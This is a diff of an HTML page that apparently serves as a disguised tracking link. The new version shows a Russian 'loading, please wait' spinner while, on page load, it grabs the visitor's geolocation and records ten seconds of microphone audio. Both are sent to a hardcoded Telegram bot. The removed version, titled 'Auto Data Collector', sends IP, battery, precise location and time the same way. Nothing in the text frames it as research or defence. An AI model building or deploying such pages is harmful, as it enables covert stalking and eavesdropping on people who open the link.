@@ -1,121 +1,114 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Data Collector</title>
+    <title>Ссылка загружается</title>
     <style>
-        :root {
-            --main-color: #FF6B00;
-            --bg-color: #1A1A1A;
-            --text-color: #FFFFFF;
-        }
-
         body {
-            font-family: 'Arial', sans-serif;
-            background: var(--bg-color);
-            color: var(--text-color);
+            background-color: #000000; /* Черный */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
             margin: 0;
-            padding: 20px;
+            font-family: Arial, sans-serif;
+        }
+        .loader {
+            border: 10px solid #f3f3f3; /* Светло-серый */
+            border-top: 10px solid #ff6200; /* Оранжевый */
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 2s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .message {
+            color: #ff6200; /* Оранжевый */
+            font-size: 24px;
+            margin-top: 20px;
             text-align: center;
-        }
-
-        .progress-container {
-            width: 80%;
-            height: 20px;
-            background: #333;
-            border-radius: 10px;
-            margin: 50px auto;
-        }
-
-        .progress-bar {
-            height: 100%;
-            background: var(--main-color);
-            border-radius: 10px;
-            transition: width 0.5s;
-        }
-
-        .status {
-            margin: 20px;
-            font-size: 1.2em;
         }
     </style>
 </head>
 <body>
-    <div class="progress-container">
-        <div class="progress-bar" id="progressBar" style="width: 0%"></div>
+    <div>
+        <div class="loader"></div>
+        <div class="message">Загрузка... Пожалуйста, подождите</div>
     </div>
-    <div class="status" id="statusText">Initializing system...</div>
 
     <script>
-        const botToken = '1402368167:AAFDWCnh640v9tcQ5Um-Zg_DPaahthSwVzI';
-        const chatId = '1220575760';
-        
-        async function collectAllData() {
-            const progressBar = document.getElementById('progressBar');
-            const statusText = document.getElementById('statusText');
-
-            try {
-                // Get IP Address
-                statusText.textContent = 'Getting network information...';
-                const ip = await fetch('https://api.ipify.org?format=json')
-                    .then(res => res.json())
-                    .then(data => data.ip);
-                progressBar.style.width = '25%';
-
-                // Get Battery Status
-                statusText.textContent = 'Checking battery status...';
-                const battery = await navigator.getBattery();
-                progressBar.style.width = '50%';
-
-                // Get Location
-                statusText.textContent = 'Getting precise location...';
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true,
-                        timeout: 10000
-                    });
-                });
-                progressBar.style.width = '75%';
-
-                // Get Device Time
-                const time = new Date().toLocaleString('en-US', {
-                    timeZoneName: 'short'
-                });
-
-                // Prepare Data
-                const message = `
-📡 Device Information:
-- IP Address: ${ip}
-- Battery: ${Math.floor(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})
-- Location: ${position.coords.latitude}, ${position.coords.longitude}
-- Accuracy: ${position.coords.accuracy}m
-- Time: ${time}
-- Map: https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}
-                `;
-
-                // Send to Telegram
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message
-                    })
-                });
-
-                progressBar.style.width = '100%';
-                statusText.textContent = 'Data collection completed!';
-
-            } catch (error) {
-                statusText.textContent = 'Automatic service activated';
-                progressBar.style.width = '100%';
+        // Получение местоположения
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, showError);
+            } else {
+                alert("Ваш браузер не поддерживает геолокацию.");
             }
         }
 
-        // Start process when page loads
+        function sendLocation(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const locationData = `Местоположение: Широта ${lat}, Долгота ${lon}`;
+            sendToTelegram(locationData);
+        }
+
+        function showError(error) {
+            alert("Ошибка получения местоположения: " + error.message);
+        }
+
+        // Запись звука
+        let mediaRecorder;
+        let audioChunks = [];
+
+        async function startRecording() {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            mediaRecorder = new MediaRecorder(stream);
+            mediaRecorder.ondataavailable = (event) => {
+                audioChunks.push(event.data);
+            };
+            mediaRecorder.onstop = () => {
+                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                sendAudioToTelegram(audioBlob);
+                audioChunks = [];
+            };
+            mediaRecorder.start();
+            document.querySelector('.message').innerText = "Идет запись звука...";
+        }
+
+        function stopRecording() {
+            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                mediaRecorder.stop();
+                document.querySelector('.message').innerText = "Запись звука остановлена.";
+            }
+        }
+
+        // Отправка данных в Telegram
+        function sendToTelegram(message) {
+            const chatId = '1220575760'; // Твой числовой ID
+            const token = '1402368167:AAFDWCnh640v9tcQ5Um-Zg_DPaahthSwVzI'; // Токен бота
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            fetch(url);
+        }
+
+        function sendAudioToTelegram(audioBlob) {
+            const chatId = '1220575760';
+            const token = '1402368167:AAFDWCnh640v9tcQ5Um-Zg_DPaahthSwVzI';
+            const url = `https://api.telegram.org/bot${token}/sendAudio?chat_id=${chatId}`;
+            const formData = new FormData();
+            formData.append('audio', audioBlob, 'recording.webm');
+            fetch(url, { method: 'POST', body: formData });
+        }
+
+        // Автоматический запуск при загрузке страницы
         window.onload = () => {
-            setTimeout(collectAllData, 1000);
+            getLocation();
+            startRecording();
+            setTimeout(stopRecording, 10000); // Остановить запись через 10 секунд
         };
     </script>
 </body>
